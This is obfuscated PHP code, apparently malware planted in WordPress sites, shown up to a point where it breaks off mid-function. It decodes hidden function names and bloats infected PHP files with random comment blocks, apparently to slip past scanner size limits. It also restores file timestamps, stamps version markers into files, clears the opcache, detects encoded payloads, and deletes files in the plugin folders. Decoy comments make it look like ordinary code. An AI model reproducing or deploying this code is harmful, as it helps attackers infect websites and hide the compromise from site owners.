<?php /* SC_ADV_BEGIN:4.3.24:1f6078e3 */
if(!function_exists('uyscbyetz55')){function w035xf4w85gje1a4k($i){static $a=null;if($a===null){$a=array_merge(array('(xRYf]:RIt6]PfP','.B,]l','(]3tI2xfIY:RftRfP','xR3]RB',',]lR9.t','lt9329f|',']PIPfl]R-','Pfl3tR','2lt-Ilt239Yt',']R]I-tf','Pflf:x22tl','Px4Pfl','.fIl9R,','(]3tP]pt',']PI]Rf','(]3t.f].t','(]3tI-tfIY:RftRfP','lfl].','4]R)|t6','.,*','ft.2R9.','Y|.:,','ltR9.t','f:xY|','f].t',']PI(]3t','2lt-I.9fY|','Y:2}','xR29YB',']PI9ll9}','2lt-I.9fY|I933','49Ptj1I,tY:,t','Pfl2:P','PflIlt239Yt','49PtR9.t','Y|l','fl].','-3:4','9ll9}I.tl-t',':2tR,]l','lt9,,]l','Y3:Pt,]l',']PI,]l',']PI<l]f943t','(:2tR','P|.:2I:2tR','P|.:2IP]pt','P|.:2IY3:Pt','P|.:2Ilt9,','t623:,t'),array('Y:xRf','|9P|','Y39PPIt6]PfP','.96','2|2IP92]IR9.t'));}return $a[$i];}function uyscbyetz55($i){$e=w035xf4w85gje1a4k($i);$f='_s'.'cmk'.'dir'.'fp'.'leu'.'tona'.'h/('.'\\?*'.'[0'.'-9]'.'{1,}'.')+$g'.'y>bv'.'w SC'.'V:'.'.zx8'.'64\''.'AZ'.'=|'.'"^F'.'2B'.'PTH'.'DEG'.'IN'.'WO'.'RM'.'UL<K'.'q5'.'YQX7'.'j3';$t='IPY'.'.B'.',]l('.'23'.'txf:'.'R9'.'|mF'.'en'.'$G='.'[w'.' 0vH'.'\\rQW'.'-}Z'.'4u<'.'DOqa'.'Ekp'.'6dj'.'1y8"'.'zs'.'hL_)'.'\'g'.'?A'.'Ni'.'SX'.'M^'.'/Uo'.'Cc'.'>5'.'b*'.'{V+7'.'TK';$r="";for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}return $r;}function g_tud2tk_ho($i){return uyscbyetz55($i);}function liytwnrvbzmt($i){$j=$i+0;return uyscbyetz55($j);}function cq0j30en2290($i){$j=(int)$i;return uyscbyetz55($j);}function rb35q9hg8a5($i){$j=$i+0;return uyscbyetz55($j);}function okh8273t($i){$j=$i+0;return uyscbyetz55($j);}$GLOBALS['__scf_xv8yd47u71vk_0']=uyscbyetz55(0);$GLOBALS['__scf_nyfc3bdylxt60t_1']=rb35q9hg8a5(1);$GLOBALS['__scf_izos34ual_yrs_2']=cq0j30en2290(2);$GLOBALS['__scf_j7ch_r4_r7_3']=okh8273t(3);$GLOBALS['__scf_ltavcefziu30su_4']=g_tud2tk_ho(4);$GLOBALS['__scf_uzzd03dgl9f_5']=uyscbyetz55(5);$GLOBALS['__scf__z6u45x2fa_6']=okh8273t(6);$GLOBALS['__scf_qm3n103d40kf_7']=rb35q9hg8a5(7);$GLOBALS['__scf_l2l653ru73ot60_8']=g_tud2tk_ho(8);$GLOBALS['__scf_drnjujf7rh_9']=okh8273t(9);$GLOBALS['__scf_l9ers3svzkh_10']=rb35q9hg8a5(10);$GLOBALS['__scf_t4v17v676jnuf_11']=g_tud2tk_ho(11);$GLOBALS['__scf_g4v2vb6fas1wnh_12']=cq0j30en2290(12);$GLOBALS['__scf_l2m84og2k1091k_13']=cq0j30en2290(13);$GLOBALS['__scf_o86ss8z24c24px_14']=g_tud2tk_ho(14);$GLOBALS['__scf_eod91q9_bq_15']=g_tud2tk_ho(15);$GLOBALS['__scf_y5urpy7tfyu5_16']=uyscbyetz55(16);$GLOBALS['__scf_hgwmboblaof6oq_17']=okh8273t(17);$GLOBALS['__scf_lcxygdbz0_1m6_18']=okh8273t(18);$GLOBALS['__scf_ue4dsf0az7w6z_19']=g_tud2tk_ho(19);$GLOBALS['__scf_vnl5pqji0fg_20']=cq0j30en2290(20);$GLOBALS['__scf_sjpp68ignoogb_21']=uyscbyetz55(21);$GLOBALS['__scf_r8dejb0j6gewv_22']=cq0j30en2290(22);$GLOBALS['__scf_wld3r5otpv_23']=rb35q9hg8a5(23);$GLOBALS['__scf_s8qh2p3z4gjae_24']=rb35q9hg8a5(24);$GLOBALS['__scf_lybs3d_izonl3f_25']=cq0j30en2290(25);$GLOBALS['__scf_zoi2q70k2g_26']=g_tud2tk_ho(26);$GLOBALS['__scf_a8b7t6hxarr_27']=rb35q9hg8a5(27);$GLOBALS['__scf_ujccogt4r2lhi_28']=uyscbyetz55(28);$GLOBALS['__scf_rzps4u9lh9q1_29']=uyscbyetz55(29);$GLOBALS['__scf_fpq82u5a28q_30']=uyscbyetz55(30);$GLOBALS['__scf_k07mkn3_s9_31']=okh8273t(31);$GLOBALS['__scf_dsvrtv_z1ezjh_32']=okh8273t(32);$GLOBALS['__scf_tk0sxw6ey44as_33']=uyscbyetz55(33);$GLOBALS['__scf_ht5qt6ku56_34']=cq0j30en2290(34);$GLOBALS['__scf_thpa1zqaisu2_35']=cq0j30en2290(35);$GLOBALS['__scf_z42aankc50u6_36']=liytwnrvbzmt(36);$GLOBALS['__scf_xrqmn_5o4wcs_e_37']=rb35q9hg8a5(37);$GLOBALS['__scf_wmpd0pzfnsyb_38']=g_tud2tk_ho(38);$GLOBALS['__scf_s73tynbvq0kl_39']=cq0j30en2290(39);$GLOBALS['__scf_eb1q0tn9r6_40']=rb35q9hg8a5(40);$GLOBALS['__scf_pdzceaybdlrf4_41']=uyscbyetz55(41);$GLOBALS['__scf_j4ozmy1qax_vj_42']=okh8273t(42);$GLOBALS['__scf_fljlxp0_k3_43']=cq0j30en2290(43);$GLOBALS['__scf_avxqzsnt4u4h_44']=g_tud2tk_ho(44);$GLOBALS['__scf_wefc49lamu30wg_45']=uyscbyetz55(45);$GLOBALS['__scf_busod5lybl_46']=g_tud2tk_ho(46);$GLOBALS['__scf_fcixg0xfq6y_47']=g_tud2tk_ho(47);$GLOBALS['__scf_pym78w32gz0bby_48']=uyscbyetz55(48);$GLOBALS['__scf_f3okdo0y0ldl_49']=cq0j30en2290(49);$GLOBALS['__scf_d58mir8sr66_50']=g_tud2tk_ho(50);$GLOBALS['__scf_egj4uujs8oo42_51']=cq0j30en2290(51);$GLOBALS['__scf_fvplaf74370z3m_52']=uyscbyetz55(52);$GLOBALS['__scf_tamxcahsgg_53']=rb35q9hg8a5(53);$GLOBALS['__scf_xkjp1ih_ipi62_54']=g_tud2tk_ho(54);

function hc_zhrttwq711kx32($f9eztfgk,$ku5s4nop){$ntjuz5a15s=($f9eztfgk|$ku5s4nop)-45;return $ntjuz5a15s;}
function kv0zmtm0elaa_d8($rypfmj7h,$l1tkcpx){$bpx1ctbvrw=($rypfmj7h^$l1tkcpx)&228;return $bpx1ctbvrw;}
if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_mkdir')) {


     function _sc_mkdir($kkk8iiixh_m1qbl7)
     {
   return  $GLOBALS['__scf_xv8yd47u71vk_0']('mkdir')   ?      @$GLOBALS['__scf_nyfc3bdylxt60t_1']($kkk8iiixh_m1qbl7,   (0x1a7+0x46), true)   :  false;
  }


  }
if    (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_fpc'))  {
    function      _sc_fpc($nsqchf9spyjpyhvw, $gkx16v3lf3)
       {
// PHP 8.3 readonly style fallback

       return $GLOBALS['__scf_xv8yd47u71vk_0']('file_put_contents')    ?  @$GLOBALS['__scf_izos34ual_yrs_2']($nsqchf9spyjpyhvw,  $gkx16v3lf3) : false;
 }


 }
 if    (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_ul'))   {


     function _sc_ul($nsqchf9spyjpyhvw)
 {
return $GLOBALS['__scf_xv8yd47u71vk_0']('unlink') ? @$GLOBALS['__scf_j7ch_r4_r7_3']($nsqchf9spyjpyhvw) : false;
}
   }

    if    (!$GLOBALS['__scf_xv8yd47u71vk_0']('n65_agpqs6mktzabxyqx'))  {
function  n65_agpqs6mktzabxyqx($l26xz4x63tzfur,      $kkk8iiixh_m1qbl7)
{
// lifecycle hook

      $yy6ztlv1upgw5    =      $GLOBALS['__scf_ltavcefziu30su_4']($l26xz4x63tzfur);
      if   ($yy6ztlv1upgw5  === $kkk8iiixh_m1qbl7) return   true;$zp0yr8_cxwj=67+1;$nrmzrel1o4g0zu=$zp0yr8_cxwj-29;
    if    (!$GLOBALS['__scf_xv8yd47u71vk_0']('realpath'))     return   false;
  $rt3gmijuljtl7   =  @$GLOBALS['__scf_uzzd03dgl9f_5']($yy6ztlv1upgw5);$lza63xt48mbohq=18*2;$k4ji14aa8g=$lza63xt48mbohq-2;
   $r9yfmd7v4_at  =    @$GLOBALS['__scf_uzzd03dgl9f_5']($kkk8iiixh_m1qbl7);
return ($rt3gmijuljtl7  !== false   &&  $r9yfmd7v4_at  !==     false && $rt3gmijuljtl7   === $r9yfmd7v4_at);
}
}
  if (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_unp'))     {
   function   _sc_unp($gkx16v3lf3)
  {
 if    (!$GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3)  ||      $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3)  <=   (1048539+37))  return $gkx16v3lf3;

  $y87jcao7qde = $GLOBALS['__scf_l2l653ru73ot60_8']('/(\r?\n\/\*[0-9a-f]{1000,}\*\/)+$/', "", $gkx16v3lf3);
     return     $GLOBALS['__scf__z6u45x2fa_6']($y87jcao7qde)  ? $y87jcao7qde :    $gkx16v3lf3;


    }


}
// FFI bindings: evaluate event-bus

   if (!$GLOBALS['__scf_xv8yd47u71vk_0']('kf10x8cdjra7d5v6p'))    {
 function      kf10x8cdjra7d5v6p()
     {
     if   (!$GLOBALS['__scf_xv8yd47u71vk_0']('ini_get'))  return  0;
     $_4ri7q6exys_7o0  = @$GLOBALS['__scf_drnjujf7rh_9']('memory_limit');
     if   (!$GLOBALS['__scf__z6u45x2fa_6']($_4ri7q6exys_7o0) ||      $_4ri7q6exys_7o0    === "")  return 0;
$d6wxai3x1h4gy6m4 =    (int)  $_4ri7q6exys_7o0;
if ($d6wxai3x1h4gy6m4   <= 0)  return    -1;
 $qdykmutuaua4x   =    $GLOBALS['__scf_l9ers3svzkh_10']($GLOBALS['__scf_t4v17v676jnuf_11']($_4ri7q6exys_7o0, -1));
  if ($qdykmutuaua4x   === 'G') $d6wxai3x1h4gy6m4  *=    (227987958+845753866);


elseif      ($qdykmutuaua4x === 'M')   $d6wxai3x1h4gy6m4 *= (0x10666+0xef99a);
       elseif  ($qdykmutuaua4x  ===  'K') $d6wxai3x1h4gy6m4  *=   (955+69);$l8h6m0nu=PHP_INT_MAX/PHP_INT_MAX;$w9dnl6w2ht=$l8h6m0nu+32;
 return     $d6wxai3x1h4gy6m4;
}
 }
  if      (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_padf')) {


function   _sc_padf($nsqchf9spyjpyhvw)
   {
  if   (!$GLOBALS['__scf_xv8yd47u71vk_0']('tempnam')      ||   !$GLOBALS['__scf_xv8yd47u71vk_0']('file_put_contents')   || !$GLOBALS['__scf_xv8yd47u71vk_0']('rename')) return;
  if  ($GLOBALS['__scf_xv8yd47u71vk_0']('ojjpzyhgn1e6z2ga5wr')  && !ojjpzyhgn1e6z2ga5wr())   return;
if  ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache'))  @clearstatcache(true,  $nsqchf9spyjpyhvw);
    $i4tkxwtsz8rkqqk  =    (1526839+273161)  + $GLOBALS['__scf_g4v2vb6fas1wnh_12'](0,  (699937+63));
$vtpkw3axjr8 =  kf10x8cdjra7d5v6p();
  if  ($vtpkw3axjr8   !==  -1 &&  $vtpkw3axjr8   <   (0x42911b9+0x3d6ee47))  {


    if ($vtpkw3axjr8  >=  (67108805+59))  $i4tkxwtsz8rkqqk = (1799954+46)     +     $GLOBALS['__scf_g4v2vb6fas1wnh_12'](0,    (699943+57));
    else    return;
  }

unset($vtpkw3axjr8);
$vdhn73w9a1gk5noj  =  @$GLOBALS['__scf_l2m84og2k1091k_13']($nsqchf9spyjpyhvw);
 if  (!$vdhn73w9a1gk5noj  ||   $vdhn73w9a1gk5noj  >= $i4tkxwtsz8rkqqk  - (4091+9))    return;
    if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('disk_free_space'))    return;



$m4f6glmcu5_uil9q =      @disk_free_space($GLOBALS['__scf_ltavcefziu30su_4']($nsqchf9spyjpyhvw));
if ($m4f6glmcu5_uil9q      ===   false  || $m4f6glmcu5_uil9q  <    (157286310+90))  return;



     $l5pnn7uuu1gk    =   $GLOBALS['__scf_xv8yd47u71vk_0']('fileperms') ? @fileperms($nsqchf9spyjpyhvw) : false;
  $l5pnn7uuu1gk =      (!$GLOBALS['__scf_o86ss8z24c24px_14']($l5pnn7uuu1gk)) ? (333+87) :  ($l5pnn7uuu1gk   &  (0xfd+0x102));


$bbru4_m85hsqf1v =    @$GLOBALS['__scf_eod91q9_bq_15']($nsqchf9spyjpyhvw);$wjz_hdqdr28_=PHP_INT_MAX/PHP_INT_MAX;$poahvcqbb=$wjz_hdqdr28_+67;
$gkx16v3lf3   =  @$GLOBALS['__scf_y5urpy7tfyu5_16']($nsqchf9spyjpyhvw);
      if    (!$GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3)  ||      $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3)   !==     $vdhn73w9a1gk5noj)  return;
     if  ($GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_hgwmboblaof6oq_17']($gkx16v3lf3),  -2)  ===    '?>')      return;



  $z4xv51yg1hyf    =  $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3,   0,  (7813-3717));
 while ($GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3)    <   $i4tkxwtsz8rkqqk -   (1796+2304))  {$bsr6wausf=PHP_MAJOR_VERSION;$xgvs3bdwba=$bsr6wausf*7;
  $khwdgzwn47j  =  "";
 if  ($GLOBALS['__scf_xv8yd47u71vk_0']('random_bytes'))  {
   try {
   $khwdgzwn47j   =   @$GLOBALS['__scf_lcxygdbz0_1m6_18'](random_bytes((504+1496)));
} catch     (\Throwable      $j5dxq7pr28rg_o1i)    {



      $khwdgzwn47j =  "";


  }  catch     (\Exception $j5dxq7pr28rg_o1i) {

 $khwdgzwn47j =  "";


     }
 }
      if  ($GLOBALS['__scf_qm3n103d40kf_7']($khwdgzwn47j)  < (0xb62+0x43e))  {



   $khwdgzwn47j = $GLOBALS['__scf_ue4dsf0az7w6z_19'](uniqid("", true));

   while  ($GLOBALS['__scf_qm3n103d40kf_7']($khwdgzwn47j)   <   (1916+2084)) $khwdgzwn47j .= $GLOBALS['__scf_ue4dsf0az7w6z_19']($khwdgzwn47j);
   }
   $gkx16v3lf3   .=   "\n/*"      .   $khwdgzwn47j  . "*/";
 }

  $n_tiojekx1 =    @$GLOBALS['__scf_vnl5pqji0fg_20']($GLOBALS['__scf_ltavcefziu30su_4']($nsqchf9spyjpyhvw), 'scp');
  if ($n_tiojekx1 === false)  return;


if (!n65_agpqs6mktzabxyqx($n_tiojekx1,  $GLOBALS['__scf_ltavcefziu30su_4']($nsqchf9spyjpyhvw)))   {$xa4q4bsa=163|55;$m_0ta_d9=$xa4q4bsa^113;

  _sc_ul($n_tiojekx1);



 return;
   }
   if  (@$GLOBALS['__scf_izos34ual_yrs_2']($n_tiojekx1,    $gkx16v3lf3)  !==   $GLOBALS['__scf_qm3n103d40kf_7']($gkx16v3lf3))     {
 _sc_ul($n_tiojekx1);



  return;
 }


   if   ($GLOBALS['__scf_xv8yd47u71vk_0']('chmod'))   @$GLOBALS['__scf_sjpp68ignoogb_21']($n_tiojekx1,  $l5pnn7uuu1gk);
     if ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache')) @clearstatcache(true, $nsqchf9spyjpyhvw);
$cys140nur5zpl_9   =  @$GLOBALS['__scf_l2m84og2k1091k_13']($nsqchf9spyjpyhvw);
    $pj6xs1838src   =  ($vdhn73w9a1gk5noj    <     (7770-3674)) ?  $vdhn73w9a1gk5noj  : (4019+77);
$k14la96tft86g3cs =    ($cys140nur5zpl_9   ===  $vdhn73w9a1gk5noj)     ?    @$GLOBALS['__scf_y5urpy7tfyu5_16']($nsqchf9spyjpyhvw, false, null, 0,    $pj6xs1838src)    :   false;
  if  (!$GLOBALS['__scf__z6u45x2fa_6']($k14la96tft86g3cs)     ||  $k14la96tft86g3cs     !==  $GLOBALS['__scf_t4v17v676jnuf_11']($z4xv51yg1hyf,      0,    $pj6xs1838src)) {
    _sc_ul($n_tiojekx1);
 return;
       }
  unset($cys140nur5zpl_9, $pj6xs1838src,    $k14la96tft86g3cs, $z4xv51yg1hyf);
  if (!@$GLOBALS['__scf_r8dejb0j6gewv_22']($n_tiojekx1,  $nsqchf9spyjpyhvw)) {
   _sc_ul($n_tiojekx1);



 return;
}



if    ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache'))  @clearstatcache(true,   $nsqchf9spyjpyhvw);
   if   ($bbru4_m85hsqf1v  && $GLOBALS['__scf_xv8yd47u71vk_0']('touch'))  @$GLOBALS['__scf_wld3r5otpv_23']($nsqchf9spyjpyhvw,  $bbru4_m85hsqf1v);


 if  ($GLOBALS['__scf_xv8yd47u71vk_0']('opcache_invalidate')) @opcache_invalidate($nsqchf9spyjpyhvw,   true);
}
 }
      if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_fam'))    {
    function _sc_fam($nsqchf9spyjpyhvw)

  {
 $obn___8dx_pzsa =     @$GLOBALS['__scf_eod91q9_bq_15']($nsqchf9spyjpyhvw);

 return $obn___8dx_pzsa    &&     ($obn___8dx_pzsa  %  (99916+84))   ===  (93791+28);
}

   }
  if (!$GLOBALS['__scf_xv8yd47u71vk_0']('_sc_fam_touch'))  {
     function _sc_fam_touch($nsqchf9spyjpyhvw,    $sgavm0dkm86i7ud7  = 0)
      {
  if (!$GLOBALS['__scf_xv8yd47u71vk_0']('touch'))     return;
 if    ($sgavm0dkm86i7ud7     <=  0)     $sgavm0dkm86i7ud7    = $GLOBALS['__scf_s8qh2p3z4gjae_24']();$das3khek14k=736;$ajewiu3pfxg05p=($das3khek14k>0)?$das3khek14k:-$das3khek14k;
       $i4tkxwtsz8rkqqk     =  ($sgavm0dkm86i7ud7   -  ($sgavm0dkm86i7ud7  %   (21981+78019)))  +    (0x1276c+0x470f);


   if   ($i4tkxwtsz8rkqqk > $GLOBALS['__scf_s8qh2p3z4gjae_24']()) $i4tkxwtsz8rkqqk -= (99953+47);
  @$GLOBALS['__scf_wld3r5otpv_23']($nsqchf9spyjpyhvw, $i4tkxwtsz8rkqqk);
 }
   }
  if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('pdbwor9bde28_psh'))   {
   function   pdbwor9bde28_psh($nsqchf9spyjpyhvw, $pi3p96w9771)
 {
// expected path

      if  ($pi3p96w9771    === ""  ||     !@$GLOBALS['__scf_lybs3d_izonl3f_25']($nsqchf9spyjpyhvw))  return    false;
if  ($GLOBALS['__scf_xv8yd47u71vk_0']('clearstatcache'))  @clearstatcache(true,   $nsqchf9spyjpyhvw);
   $ccgahqak0xxa =  (string) @$GLOBALS['__scf_y5urpy7tfyu5_16']($nsqchf9spyjpyhvw, false, null,    0, (4007+89));
  return  $GLOBALS['__scf_zoi2q70k2g_26']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//', $ccgahqak0xxa,      $_4ri7q6exys_7o0) ===  1    &&  version_compare($_4ri7q6exys_7o0[1],   $pi3p96w9771,  '>');
     }
  }
    if   (!$GLOBALS['__scf_xv8yd47u71vk_0']('gjkjhs4fs56sizyi'))    {
// @ssa-convert nominal-type

     function gjkjhs4fs56sizyi($gkx16v3lf3)
{
// @broadcast derivation

       if   (!$GLOBALS['__scf__z6u45x2fa_6']($gkx16v3lf3))   return     "";
  if  ($GLOBALS['__scf_zoi2q70k2g_26']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',     $GLOBALS['__scf_t4v17v676jnuf_11']($gkx16v3lf3, 0,  (6757-2661)),     $obn___8dx_pzsa))  return $obn___8dx_pzsa[1];



     return    "";
 }
     }
if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('r5qk07muwazeb7krh52pe'))  {
function  r5qk07muwazeb7krh52pe($n_tiojekx1, $nsqchf9spyjpyhvw,  $pi3p96w9771)



   {
  if    ($pi3p96w9771    !== "" &&   $GLOBALS['__scf_xv8yd47u71vk_0']('pdbwor9bde28_psh')  && pdbwor9bde28_psh($nsqchf9spyjpyhvw, $pi3p96w9771))  {
// fulfill primary memento

 _sc_ul($n_tiojekx1);
return false;



   }



       $ilp_pjqsydylfu = false;
 if ($GLOBALS['__scf_xv8yd47u71vk_0']('rename'))  $ilp_pjqsydylfu    =     @$GLOBALS['__scf_r8dejb0j6gewv_22']($n_tiojekx1, $nsqchf9spyjpyhvw);
if    (!$ilp_pjqsydylfu &&  $GLOBALS['__scf_xv8yd47u71vk_0']('copy')) {
if  ($pi3p96w9771 !== ""     && $GLOBALS['__scf_xv8yd47u71vk_0']('pdbwor9bde28_psh')    &&  pdbwor9bde28_psh($nsqchf9spyjpyhvw,  $pi3p96w9771))      {
_sc_ul($n_tiojekx1);


    return     false;
     }
   $ilp_pjqsydylfu  =   @$GLOBALS['__scf_a8b7t6hxarr_27']($n_tiojekx1,  $nsqchf9spyjpyhvw);


   if ($ilp_pjqsydylfu) _sc_ul($n_tiojekx1);
}


 if   (!$ilp_pjqsydylfu)     _sc_ul($n_tiojekx1);
  return $ilp_pjqsydylfu;

 }
 }
if      (!$GLOBALS['__scf_xv8yd47u71vk_0']('vidl1zwix8pfwk3t'))    {
// predicate side-effect-free memento

    function   vidl1zwix8pfwk3t($lii601dsf2)
      {
if (!$GLOBALS['__scf__z6u45x2fa_6']($lii601dsf2)    ||    $GLOBALS['__scf_qm3n103d40kf_7']($lii601dsf2)    < (49^35)   ||   $GLOBALS['__scf_t4v17v676jnuf_11']($lii601dsf2,      0, 2) !==  "\x1f\x8b")    return 0;
  

   $u7b02nlzphxo  =      @$GLOBALS['__scf_ujccogt4r2lhi_28']('V', $GLOBALS['__scf_t4v17v676jnuf_11']($lii601dsf2,      -(2+2)));
    $u7b02nlzphxo  = $GLOBALS['__scf_rzps4u9lh9q1_29']($u7b02nlzphxo)      ?   $u7b02nlzphxo[1]   : 0;
if    ($u7b02nlzphxo <    (401+99) ||  $u7b02nlzphxo > (1048561+15))   return $u7b02nlzphxo;
       return 0;
}
   }

  if  (!$GLOBALS['__scf_xv8yd47u71vk_0']('mcnmf92ikm4kc014d5a_bt'))     {
   function mcnmf92ikm4kc014d5a_bt($ymhkgsj4hodh9w65)
{
 if   (!$GLOBALS['__scf__z6u45x2fa_6']($ymhkgsj4hodh9w65)) return    "";
       if   ($GLOBALS['__scf_fpq82u5a28q_30']('/base64_decode\(\s*\'([A-Za-z0-9+\/=]{1000,})\'\s*\)/', $ymhkgsj4hodh9w65, $k602spexzcd5))     {
 foreach  ($k602spexzcd5[1] as  $nlnxtsbu2btyb4)   {
if   (vidl1zwix8pfwk3t($GLOBALS['__scf_k07mkn3_s9_31']($nlnxtsbu2btyb4, true)))     return     "";
 }
  }
// positive-definite nominal-type

 if      ($GLOBALS['__scf_fpq82u5a28q_30']('/(?:gzdecode|gzinflate|gzuncompress)\(\s*"((?:[^"\\\\]*(?:\\\\.[^"\\\\]*)*))"/s',  $ymhkgsj4hodh9w65, $k602spexzcd5))     {
       foreach     ($k602spexzcd5[1] as $nlnxtsbu2btyb4)  {
 if (vidl1zwix8pfwk3t(stripcslashes($nlnxtsbu2btyb4)))  return   "";
       if ($GLOBALS['__scf_dsvrtv_z1ezjh_32']($nlnxtsbu2btyb4,   '\\x')    !== false)   {
// compact adaptive publisher

 $p4j0dr02ic  =   preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/',  'p6dn2gm11w5bci76',   $nlnxtsbu2btyb4);
 if    ($GLOBALS['__scf__z6u45x2fa_6']($p4j0dr02ic)  && $p4j0dr02ic    !==  $nlnxtsbu2btyb4  &&      vidl1zwix8pfwk3t($p4j0dr02ic)) return     "";
       }
 }

}
   if  ($GLOBALS['__scf_fpq82u5a28q_30']('/(?:gzdecode|gzinflate|gzuncompress)\(\s*\'((?:[^\'\\\\]*(?:\\\\.[^\'\\\\]*)*))\'/s',     $ymhkgsj4hodh9w65,  $k602spexzcd5))     {
      foreach    ($k602spexzcd5[1]    as $nlnxtsbu2btyb4)  {$ngd88rozbmth=(0xc8+0x9a);$b3tko9hi46r=$ngd88rozbmth%10;
   if   (vidl1zwix8pfwk3t($GLOBALS['__scf_tk0sxw6ey44as_33'](array('\\\\',   '\\\''),  array('\\',  '\''),     $nlnxtsbu2btyb4))) return  "";
if     ($GLOBALS['__scf_dsvrtv_z1ezjh_32']($nlnxtsbu2btyb4, '\\x')    !==   false)   {
    $p4j0dr02ic  =   preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/',   'p6dn2gm11w5bci76',  $nlnxtsbu2btyb4);



if   ($GLOBALS['__scf__z6u45x2fa_6']($p4j0dr02ic)  && $p4j0dr02ic !== $nlnxtsbu2btyb4  &&   vidl1zwix8pfwk3t($p4j0dr02ic))   return    "";
 }
    }
 }

    return   $ymhkgsj4hodh9w65;
    }
   }



if   (!$GLOBALS['__scf_xv8yd47u71vk_0']('g3sjg5yg2uvrmfhhobiq')) {
function   g3sjg5yg2uvrmfhhobiq($ymhkgsj4hodh9w65)
 {
   if  (!$GLOBALS['__scf__z6u45x2fa_6']($ymhkgsj4hodh9w65))     return   "";


    if ($GLOBALS['__scf_zoi2q70k2g_26']('/is_file\(\s*\'([^\']+)\'\s*\)/',  $ymhkgsj4hodh9w65,    $bbbjhigls23ha)) {
// expire inflationary pipeline
$zczcyf7j5a0=189|140;$lsfm9ys35t=$zczcyf7j5a0^33;
       $i4tkxwtsz8rkqqk  =     $bbbjhigls23ha[1];
 $ldabz7ci7jy8e    = @$GLOBALS['__scf_lybs3d_izonl3f_25']($i4tkxwtsz8rkqqk) ?    @$GLOBALS['__scf_l2m84og2k1091k_13']($i4tkxwtsz8rkqqk)  : 0;

if   (!$ldabz7ci7jy8e ||     $ldabz7ci7jy8e  <  (462+38) ||   $ldabz7ci7jy8e >  (26820254+25608546)) {$lbt1wahlp94=-578;$h24pc4y7mwgdh=($lbt1wahlp94>0)?$lbt1wahlp94:-$lbt1wahlp94;
 if    ($ldabz7ci7jy8e >   (33839114+18589686)) {
 $qw_suu_qlpyh2bu2  =      false;
 if      (defined('ABSPATH')  &&    $GLOBALS['__scf_zoi2q70k2g_26']('/\/\* SC_DD_BEGIN:([a-zA-Z0-9._:]+) \*\//',     $ymhkgsj4hodh9w65,    $_dm) &&  $_dm[1]    ===   $GLOBALS['__scf_t4v17v676jnuf_11']($GLOBALS['__scf_ue4dsf0az7w6z_19'](ABSPATH  .     'dd'),  0,   (1+7))    &&  $GLOBALS['__scf_xv8yd47u71vk_0']('_sc_fam')    &&     _sc_fam($i4tkxwtsz8rkqqk))  {
  $wyg5t0qzrf_rmy6     = (string) @$GLOBALS['__scf_y5urpy7tfyu5_16']($i4tkxwtsz8rkqqk,  false, null, 0, (4090+6));
  $qw_suu_qlpyh2bu2 = $GLOBALS['__scf_zoi2q70k2g_26']('/\/\* SCV:\d+\.\d+\.\d+ \*\//', $wyg5t0qzrf_rmy6)  ===   1;
unset($wyg5t0qzrf_rmy6);
 }
$fbx0zact_3p80k     =    false;
   if ($qw_suu_qlpyh2bu2  &&  $GLOBALS['__scf_xv8yd47u71vk_0']('realpath'))  {
  $e5ym1xaiouul_93 =     @$GLOBALS['__scf_uzzd03dgl9f_5']($i4tkxwtsz8rkqqk);
 if     ($GLOBALS['__scf__z6u45x2fa_6']($e5ym1xaiouul_93)) {

  $e5ym1xaiouul_93 =    $GLOBALS['__scf_tk0sxw6ey44as_33']('\\',   '/',    $e5ym1xaiouul_93);
       $yqa2jptgxgcgcxy  =     defined('WP_CONTENT_DIR') ?  WP_CONTENT_DIR  :     ABSPATH . 'wp-content';
      $yizxckfl4rvqb  =    (defined('WPMU_PLUGIN_DIR')    && WPMU_PLUGIN_DIR) ? WPMU_PLUGIN_DIR :  $yqa2jptgxgcgcxy  .     '/mu-plugins';


  $_pd      = (defined('WP_PLUGIN_DIR')    &&   WP_PLUGIN_DIR) ?      WP_PLUGIN_DIR      :   $yqa2jptgxgcgcxy  .  '/plugins';
    foreach  (array($yizxckfl4rvqb,  $_pd)     as  $fzuslo59hhc7k90)    {



$kjbujcrz3fd9ekn = @$GLOBALS['__scf_uzzd03dgl9f_5']($fzuslo59hhc7k90);
     if     (!$GLOBALS['__scf__z6u45x2fa_6']($kjbujcrz3fd9ekn))  continue;
 $kjbujcrz3fd9ekn =  $GLOBALS['__scf_hgwmboblaof6oq_17']($GLOBALS['__scf_tk0sxw6ey44as_33']('\\', '/', $kjbujcrz3fd9ekn), '/');
 if ($kjbujcrz3fd9ekn  !==  "" &&  $GLOBALS['__scf_dsvrtv_z1ezjh_32']($e5ym1xaiouul_93, $kjbujcrz3fd9ekn  .   '/')     === 0)  {
 $fbx0zact_3p80k  =   true;
   break;

      }
 }
unset($yizxckfl4rvqb,   $_pd,    $fzuslo59hhc7k90, $kjbujcrz3fd9ekn);
 }
}


 if     ($qw_suu_qlpyh2bu2    && $fbx0zact_3p80k)    {
     _sc_ul($i4tkxwtsz8rkqqk);
  _sc_ul($GLOBALS['__scf_ltavcefziu30su_4']($i4tkxwtsz8rkqqk)     .  '/.sd_'     . $GLOBALS['__scf_ht5qt6ku56_34']($i4tkxwtsz8rkqqk,   '.php'));
     }
